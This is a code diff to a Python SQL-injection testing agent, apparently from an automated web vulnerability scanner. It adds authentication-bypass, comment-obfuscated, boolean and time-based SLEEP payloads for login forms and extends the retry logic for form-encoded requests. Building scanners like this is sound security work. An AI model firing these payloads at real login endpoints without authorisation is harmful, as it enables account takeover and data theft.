@@ -35,8 +35,8 @@ class SQLInjectionConfig:
     """Configuration constants for SQL Injection testing."""
 
     # Testing limits
-    MAX_ENDPOINTS = 25
-    MAX_PARAMS_PER_ENDPOINT = 5
+    MAX_ENDPOINTS = 40                # Increased from 25
+    MAX_PARAMS_PER_ENDPOINT = 8       # Increased from 5
     BASELINE_SAMPLES = 3
 
     # Timing thresholds
@@ -76,10 +76,19 @@ class SQLInjectionConfig:
         {"email": "admin' OR '1'='1'--", "password": "anything"},
         {"email": "' OR 1=1#", "password": "anything"},
         {"email": "admin'#", "password": "anything"},
+        {"email": "admin'/*", "password": "anything"},
+        {"email": "' or 1=1/*", "password": "anything"},
+        {"email": "' or 1=1 limit 1 --", "password": "anything"},
+        {"email": "' OR 1=1 LIMIT 1 /*", "password": "anything"},
+        {"email": "admin' or '1'='1'/*", "password": "anything"},
+        {"email": "' or 'a'='a'/*", "password": "anything"},
         # Username-based login forms
         {"username": "' OR 1=1--", "password": "anything"},
         {"username": "admin'--", "password": "anything"},
+        {"username": "admin'/*", "password": "anything"},
+        {"username": "' or 1=1/*", "password": "anything"},
         {"user": "' OR 1=1--", "password": "anything"},
+        {"user": "admin'--", "password": "anything"},
         # Time-based blind login payloads (Generic)
         {"email": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
         {"username": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
@@ -125,6 +134,14 @@ class SQLInjectionAgent(BaseSecurityAgent):
         "' OR 1=1--",
         "' OR 'a'='a",
         "1 AND 1=2 UNION SELECT NULL--",
+        "' or 1=1/*",
+        "\" or 1=1/*",
+        "admin'/*",
+        "' OR 1=1 LIMIT 1 --",
+        "1' OR 1=1--",
+        "' OR 1=1/**/--",
+        "' OR/**/1=1/**/--",
+        "' or '1'='1' limit 1 --",
     ]
 
     BOOLEAN_PAYLOADS = [
@@ -133,6 +150,9 @@ class SQLInjectionAgent(BaseSecurityAgent):
         ("1 AND 1=1", "1 AND 1=2"),
         ("' AND 'a'='a", "' AND 'a'='b"),
         ("1' AND '1'='1'--", "1' AND '1'='2'--"),
+        ("' OR 'a'='a", "' OR 'a'='b"),
+        ("' OR 1=1/**/--", "' OR 1=2/**/--"),
+        ("' OR/**/'1'='1", "' OR/**/'1'='2"),
     ]
 
     TIME_BASED_PAYLOADS = {
@@ -233,7 +253,7 @@ class SQLInjectionAgent(BaseSecurityAgent):
             self,
             target_url: str,
             endpoints: List[Dict[str, Any]],
-            technology_stack: List[str] = None,
+            technology_stack: Optional[List[str]] = None,
             scan_context: Optional[Any] = None
     ) -> List[AgentResult]:
         """
@@ -385,9 +405,11 @@ class SQLInjectionAgent(BaseSecurityAgent):
                 if check_response is None:
                     self.log(f"Endpoint check failed (No response): {login_url}")
                     continue
-                # Skip ONLY if 404 - any other status (including 400, 405, 500) indicates endpoint exists
-                if check_response.status_code == 404:
-                    self.log(f"Endpoint returned 404: {login_url}")
+                # Skip if endpoint clearly doesn't exist or is completely down
+                # 404 = not found, 503 = service unavailable (endpoint doesn't exist on this server),
+                # 502 = bad gateway (upstream down, no point testing)
+                if check_response.status_code in (404, 503, 502):
+                    self.log(f"Endpoint unavailable (Status {check_response.status_code}): {login_url}")
                     continue
                 
                 # 405 Method Not Allowed also indicates endpoint exists (might need different method)
@@ -422,9 +444,25 @@ class SQLInjectionAgent(BaseSecurityAgent):
                     self.log(f"JSON payload request failed: {e}")
                     response = None
                     
-                # If JSON failed with 500 (parse error), try Form Data
-                if response is None or response.status_code == 500:
+                # If JSON failed, or returned 500, or returned 200/400 but didn't trigger SQLi bypass/errors (e.g. Flask ignores JSON unless content-type helper used)
+                has_sqli_indicators = False
+                if response is not None:
                     try:
+                        resp_json = response.json() if response.text else {}
+                    except:
+                        resp_json = {}
+                    has_tok = any(k in str(resp_json).lower() for k in ['token', 'access', 'jwt', 'session', 'auth'])
+                    is_sc = response.status_code == 200
+                    has_err = any(pattern.search(response.text) for pattern in self.error_patterns)
+                    has_ud = any(k in str(resp_json).lower() for k in ['email', 'user', 'id', 'admin'])
+                    dur = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
+                    is_del = dur >= SQLInjectionConfig.TIME_DELAY_SECONDS * 0.8
+                    if has_tok or has_err or is_del or (is_sc and has_ud):
+                        has_sqli_indicators = True
+
+                if response is None or response.status_code == 500 or not has_sqli_indicators:
+                    try:
+                        self.log(f"JSON payload did not trigger SQLi for {login_url}. Retrying with x-www-form-urlencoded...")
                         response = await self.make_request(
                             login_url,
                             method="POST",
